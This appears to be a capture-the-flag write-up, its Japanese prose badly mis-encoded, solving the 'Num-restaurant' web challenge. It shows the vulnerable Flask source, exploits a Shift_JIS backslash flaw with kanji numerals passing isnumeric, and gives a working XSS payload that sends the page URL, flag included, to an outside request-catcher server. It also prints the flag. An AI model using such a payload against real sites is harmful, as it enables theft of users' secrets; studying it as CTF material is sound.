# Num-restaurantð·

## åé¡æ
Adminããè¹ãç©ºããã¦ãã¾ãã  
ãã ãå«ããªãã®ãããããã§ãã  
[http://160.251.83.96:31415](http://160.251.83.96:31415/)  
[app.py](files/app.py)  

## é£æåº¦
**medium**  

## ä½åã«ããã£ã¦
5Cåé¡åãåºãããã£ãã®ã§ãããããã ãã ã¨ç°¡åãããã®ã§pythonã®`isnumeric`ã¨çµã¿åããã¾ããã  
ãã©ã¦ã¶ã®ãã°ã«ãããæå­ã³ã¼ãå¤å®ããããããªããã¨ã§XSSãçºçããèå¼±æ§ãè¦ã¤ãããã¨ãããããããåãã¿ã§ãã  
æãããã®ãã¤ã¤ã§ããã­...ã  

## è§£æ³
ãµã¤ãã«ã¢ã¯ã»ã¹ããã¨è¬ã®ã¡ãã¥ã¼ãè¡¨ç¤ºããã¦ããã  
![site.png](images/site.png)  
éå¸ãããapp.pyã¯ä»¥ä¸ã®ããã ã£ãã  
```python
~~~
def sanitize_price(price):
    if not price.isnumeric():
        return "10000000"
    return price

def sanitize_meal(meal):
    if not meal.isascii():
        return "Kasumi"
    #Is it possible to block XSS?
    return "".join([c for c in meal if ord(c) > 0x1f]).replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("http", "num")

@app.route("/")
def num_restaurant():
    niku = random.randint(1, 1000000)
    sushi = random.randint(1, 1000000)
    yasai = random.randint(1, 1000000)
    price = request.args.get("price")
    meal = request.args.get("meal")
    if (not price) or (not meal):
        script = ''
    else:
        script = f'''<script>
var text = "ï¿¥{sanitize_price(price)}{sanitize_meal(meal)}ðYummy!!";
alert(text);
</script>
'''
    html = f"""<!DOCTYPE html>
<html lang="ja">
<head>
<title>Num-restaurant</title>
{script}
</head>
<body>
<h1>Welcome to Num-restaurant ð¥</h1>
<a href="?price={niku}&meal=Niku"><p style="font-size:200%;">ï¿¥{niku} / Nikuð</p></a>
<a href="?price={sushi}&meal=Sushi"><p style="font-size:200%;">ï¿¥{sushi} / Sushið£</p></a>
<a href="?price={yasai}&meal=Yasai"><p style="font-size:200%;">ï¿¥{yasai} / Yasaið¥</p></a>
</body>
</html>
"""
    if request.args.get("encoding") == "shift_jis":
        return Response(html, content_type='text/html; charset=shift_jis')
        #No one uses it anymore, but I implemented it because I was born in 1997 and missed it.
    else:
        return Response(html, content_type='text/html; charset=utf-8')
~~~
```
åã¡ãã¥ã¼ã¯ãªã³ã¯ã¨ãªã£ã¦ãã¦ã`price`ã`meal`ã`encoding`ãæå®ã§ããããã ã  
ãµãã¿ã¤ãºã¯å®ç§ãªããã«è¦ãã`price`ã¯æ°å­ã`meal`ã¯ASCIIã¨ãªã£ã¦ããã  
è©¦ãã«`?price=1&meal=Niku`ã«ã¢ã¯ã»ã¹ããã¨`ï¿¥1NikuðYummy!!`ã¨alertãããã  
`shift_jis`ãæªãããæåãª5Cåé¡XSSãçãããã ãããµãã¿ã¤ãºã«ãããã«ããã¤ãæå­ãå©ç¨ã§ããªãããã«è¦ããã  
æ¬¡ã«flagã®å ´æãç¢ºèªããã¨ãä»¥ä¸ã®ããã«`/admin`ããAdminãã¯ã¨ãªã«æ¸¡ãã¢ã¯ã»ã¹ãã¦ããã  
```python
~~
        url = f'http://160.251.83.96:31415?price={urllib.parse.quote(request.form["price"])}\
&meal={urllib.parse.quote(request.form["meal"])}\
&encoding={urllib.parse.quote(request.form["encoding"])}'
        try:
            flag = os.getenv("FLAG")
            cmd = f'chromium-browser --no-sandbox --headless --disable-gpu "{url}&flag={flag}"'
            subprocess.run(cmd, shell=True, timeout=3)
        except:
            return "Adminð¥°Yummy!!"
        return "Adminð¤¤Yucky!!"
~~~
```
ã¢ã¯ã»ã¹ããURLã¯æå®ããã¦ããchromiumã®Exploitã§ã®RCEãOSã³ãã³ãã¤ã³ã¸ã§ã¯ã·ã§ã³ã¯çããªã(ã¯ã)ããããã¯ãXSSãããããªãããã§ããã  
æ¹éã¨ãã¦5Cåé¡ãçãã`";alert(1);//`ã®ãµãã¿ã¤ãºçµæã§ãã`\";alert(1);//`ã®åæ¹ã®ããã¯ã¹ã©ãã·ã¥ãæ¶ããã¨ãèããã  
ä¾ã¨ãã¦``è¡¨";alert(1);//``ãªã©ãèããããã  
ããã§åé¡ã¨ãªãã®ãã`meal`ã«ã¯ãã«ããã¤ãæå­ãå«ãããã¨ãã§ããªãç¹ã§ããã  
ããã½ã¼ã¹ãè¦³å¯ããã¨`var text = "ï¿¥{sanitize_price(price)}{sanitize_meal(meal)}ðYummy!!";`ã§ããã®ã§ã`price`ã«ãã«ããã¤ãæå­ãå«ãã¦ãåæ§ã®çµæãå¼ãèµ·ããããã ã  
ãã ãã`price`ã«ã¯`isnumeric`ãããã£ã¦ãããããæ°å­ä»¥å¤ã¯å¥åã§ããªãã  
ããã§ä»¥ä¸ã®ãããª`isnumeric`ã®æ°æã¡æªãä»æ§ãæãåºãã  
```python
>>> "12345".isnumeric()
True
>>> "è¡¨".isnumeric()
False
>>> "ç¾".isnumeric()
True
```
ã¤ã¾ãæ¼¢æ°å­ãä½¿ããããã ã  
ãã¨ã¯æ¼¢æ°å­ã®ä¸­ãã5Cåé¡ã«å©ç¨ã§ãããã®ãè¦ã¤ããã°ããã  
çµæ`å`ãå©ç¨ã§ãããã¨ããããã  
ããã«ãã`price=å`ã`meal=";alert(1);//`ã`encoding=shift_jis`ã§XSSãåºããããã«ãªãã  
`http://160.251.83.96:31415?price=å&meal=";alert(1);//&encoding=shift_jis`ã«ã¢ã¯ã»ã¹ããã¨ç¢ºèªã§ããã  
XSSãéæã§ããã®ã§ããã¨ã¯ã¢ã¯ã»ã¹ããURLãåå¾ãããªã¯ã¨ã¹ããåãåãããµã¼ãã«æããã°ããã  
ãªãã¤ã¬ã¯ãããããã¨ããã¨ãalertãªã©ã´ããã¤ãã¦ããã®ã§chromiumã§ã¯ãªãã¤ã¬ã¯ãããã¾ãèµ°ããªã(firefoxã§ã¯ç¡è¦ããã)ã  
alerté¢æ°ãæ¸ãæãã¦ããã°ãã¾ãéãã  
`http`ã`num`ã«å¤æãããã®ã¯ãã¹ã­ã¼ã ãè¨è¿°ããªããã°ããã ãã§ããã  
æçµçãªéä¿¡ã¯ã¨ãªã¯ä»¥ä¸ã«ãªãã  
`price`: `å`  
`meal`: ```"-(location.href=`//[ãªã¯ã¨ã¹ããåãåãããµã¼ã]?s=`+btoa(location.href));alert=function(){};//```  
`encoding`: `shift_jis`  
â»`[ãªã¯ã¨ã¹ããåãåãããµã¼ã]`ã¯[https://requestbin.com/](https://requestbin.com/)ãªã©ãä½¿ãã¨ããã  
ããã`/admin`ã§éä¿¡ãã¦ãã(encodingå¥åæ¬ãhiddenãªã®ã§æ³¨æ)ã  
ãµã¼ãã§åãåã£ãbase64ããããã¼ã¿ããã³ã¼ãããURLã§ã³ã¼ãããã¨flagãå¾ãããã  
![flag.png](images/flag.png)  

## imctf{1_d0n7_w4n7_70_347_5C_4nym0r3}
